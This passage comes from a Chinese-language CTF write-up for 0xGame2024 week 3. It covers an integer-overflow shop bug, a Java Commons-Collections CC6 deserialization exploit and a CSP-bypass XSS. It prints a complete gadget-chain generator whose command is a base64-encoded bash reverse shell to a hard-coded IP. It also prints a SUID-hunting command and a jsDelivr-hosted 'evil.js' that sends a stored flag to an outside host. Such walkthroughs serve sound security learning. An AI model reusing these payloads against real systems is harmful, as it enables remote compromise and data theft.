user)?;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(<span class="built_in">format!</span>(<span class="string">&quot;purchase &#123;&#125; x &#123;&#125; success&quot;</span>, name, count))</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(<span class="built_in">format!</span>(<span class="string">&quot;you don&#x27;t have enough balance&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在处理购买物品的时候先计算costs再比较costs和balance，而costs是i32类型的，先让其发生溢出，使得costs变成一个负数</p>
<img src="/2024/10/27/0xGame2024-week3/image-20241021190905881.png" class="" title="image-20241021190905881">

<p>然后再卖掉，这里注意不要让balance也溢出了</p>
<img src="/2024/10/27/0xGame2024-week3/image-20241021191014955.png" class="" title="image-20241021191014955">

<p>钱够了之后就可以买flag了</p>
<img src="/2024/10/27/0xGame2024-week3/image-20241021191204708.png" class="" title="image-20241021191204708">

<h3 id="WhySoSerial"><a href="#WhySoSerial" class="headerlink" title="WhySoSerial"></a>WhySoSerial</h3><p>反编译jar后先看pom.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>commons-collections版本为3.2.1，打CC6,</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GadgetChain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTMyLjg3LjE4My8yMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap=LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; expMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;key2&quot;</span>);</span><br><span class="line">        hashMap.remove(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass=LazyMap.class;</span><br><span class="line">        Field factoryField=lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line">        <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> serializeToBase64(expMap);</span><br><span class="line">		System.out.println(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serializeToBase64</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ByteArrayOutputStream data=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(data);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(data.toByteArray());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>反弹shell后发现读flag权限不够，执行<code>find / -perm -u=s -type f 2&gt;/dev/null</code>发现有<code>/readflag</code></p>
<img src="/2024/10/27/0xGame2024-week3/image-20241021201728400.png" class="" title="image-20241021201728400">

<h3 id="paste-bin"><a href="#paste-bin" class="headerlink" title="paste_bin"></a>paste_bin</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::&#123;env, time::Duration&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> fantoccini::ClientBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">visit_paste</span>(id: &amp;<span class="type">str</span>) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;(), <span class="type">Box</span>&lt;<span class="keyword">dyn</span> std::error::Error&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">flag</span>: <span class="type">String</span> = env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;FLAG&quot;</span>).<span class="title function_ invoke__">unwrap_or</span>(<span class="string">&quot;flag&#123;test&#125;&quot;</span>.<span class="title function_ invoke__">to_string</span>());</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">js</span> = <span class="built_in">format!</span>(<span class="string">&quot;localStorage.setItem(&#x27;flag&#x27;, &#x27;&#123;&#125;&#x27;);&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">caps</span> = serde_json::map::Map::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">opts</span> = serde_json::json!(&#123;</span><br><span class="line">        <span class="string">&quot;args&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;--headless&quot;</span>,</span><br><span class="line">            <span class="string">&quot;--no-sandbox&quot;</span>,</span><br><span class="line">            <span class="string">&quot;--disable-gpu&quot;</span>,</span><br><span class="line">            <span class="string">&quot;--disable-dev-shm-usage&quot;</span>,</span><br><span class="line">            <span class="string">&quot;--remote-debugging-port=9222&quot;</span></span><br><span class="line">        ],</span><br><span class="line">    &#125;);</span><br><span class="line">    caps.<span class="title function_ invoke__">insert</span>(<span class="string">&quot;goog:chromeOptions&quot;</span>.<span class="title function_ invoke__">to_string</span>(), opts);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">c</span> = ClientBuilder::<span class="title function_ invoke__">native</span>()</span><br><span class="line">        .<span class="title function_ invoke__">capabilities</span>(caps)</span><br><span class="line">        .<span class="title function_ invoke__">connect</span>(<span class="string">&quot;http://bot:4444&quot;</span>)</span><br><span class="line">        .<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;visiting home page&quot;</span>);</span><br><span class="line">    c.<span class="title function_ invoke__">goto</span>(<span class="string">&quot;http://web:8000/&quot;</span>).<span class="keyword">await</span>?;</span><br><span class="line">    c.<span class="title function_ invoke__">execute</span>(&amp;js, <span class="built_in">vec!</span>[]).<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;visiting paste: &#123;&#125;&quot;</span>, id);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">view_url</span> = <span class="string">&quot;http://web:8000/view?id=&quot;</span>.<span class="title function_ invoke__">to_string</span>() + id;</span><br><span class="line">    c.<span class="title function_ invoke__">goto</span>(&amp;view_url).<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;bot will sleep for 10s&quot;</span>);</span><br><span class="line">    tokio::time::<span class="title function_ invoke__">sleep</span>(Duration::<span class="title function_ invoke__">from_secs</span>(<span class="number">10</span>)).<span class="keyword">await</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;visited paste: &#123;&#125; success&quot;</span>, id);</span><br><span class="line">    c.<span class="title function_ invoke__">close</span>().<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看bot.rs，bot在访问paste的过程中，会模拟一个浏览器来访问paste，然后把flag存在这个模拟的浏览器中的localstorage</p>
<p>注意到report.html中的CSP</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">content</span>=<span class="string">&quot;base-uri &#x27;none&#x27;; style-src &#x27;unsafe-inline&#x27;; script-src &#x27;self&#x27; &#x27;sha256-mDsn/yxO0Kbxaggx7bFdeBmrC22U6cePGEUeeSwO+n0=&#x27; cdn.tailwindcss.com unpkg.com cdn.jsdelivr.net;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>也就是说只能从<code>cdn.tailwindcss.com, unpkg.com, cdn.jsdelivr.net</code>中加载脚本</p>
<p>这里我用的是<code>cdn.jsdelivr.net</code>，在CDN上部署js代码的步骤参考<a target="_blank" rel="noopener" href="https://bili33.top/posts/jsDelivr-Usage/">jsDelivr的正确打开方式 | GamerNoTitle (bili33.top)</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//evil.js</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://ip:port/&#x27;</span>+a);</span><br></pre></td></tr></table></figure>

<p>最后我们需要通过iframe标签来引入外部脚本，note如下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;script src=&#x27;https://cdn.jsdelivr.net/gh/Lyng3n/eviljs@1.0/evil.js&#x27;&gt;&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2024/10/27/0xGame2024-week3/image-20241022190150576.png" class="" title="image-20241022190150576">

<h1 id=""><a href="#" class="headerlink" title=""></a></h1>
        </article>
        <section class="post-near">
            <ul>
                
                    <li>上一篇: 看完啦 (つд⊂)</li>
                
                
                    <li>下一篇: <a href="/2024/10/24/0xGame2024-week2/">0xGame2024 week2</a></li>
                
            </ul>
        </section>
        
            <section class="post-tags">
            <a class="-none-link" href="/tags/wp/" rel="tag">wp</a>
            </section>
        
    
        <section class="post-author">
        
            <figure class="author-avatar">
                <img src="https://gravatar.com/userimage/255640517/d60e38ce04bcad4f72b37aa8b3cb4727.jpeg?size=256" alt="N0tluS" />
            </figure>
        
            <div class="author-info">
                <h4>N0tluS</h4>
                <p>ovo</p>
            </div>
        </section>
    
    </div>
</main>

    <footer>
    <div class="buttons">
        <button class="to-top" href="#"></button>
    </div>
    <div class="wrap min">
        <section class="widget">
            <div class="row">
                <div class="col-m-4">
                    <h3 class="title-recent">最新文章：</h3>
                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2024/10/27/0xGame2024-week3/">0xGame2024 week3</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/10/24/0xGame2024-week2/">0xGame2024 week2</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/10/24/0xGame2024-week1/">0xGame2024 week1</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/09/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB1/">Java反序列化之CB1</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC11/">Java反序列化之CC11</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/09/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE/">Java反序列化之CC链</a></li></ul>
                </div>
                <div class="col-m-4">
                    <h3 class="title-date">时光机：</h3>
                    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li></ul>
                </div>
                <div class="col-m-4">
                    <h3 class="title-tags">标签云：</h3>
                    <a href="/tags/Java%E5%AE%89%E5%85%A8/" style="font-size: 10px;">Java安全</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a>
                </div>
            </div>
        </section>
        <section class="sub-footer">
            <p>© 2024 <a href="/">N0tluS.site</a>. All Rights Reserved. Theme By <a href="https://github.com/Dreamer-Paul/Hingle" target="_blank" rel="nofollow">Hingle</a>.</p>
        </section>
    </div>
</footer>


<script src="/static/kico.js"></script>
<script src="/static/hingle.js"></script>


<script>var hingle = new Paul_Hingle({"copyright":false,"night":true});</script>

  </body>
</html>
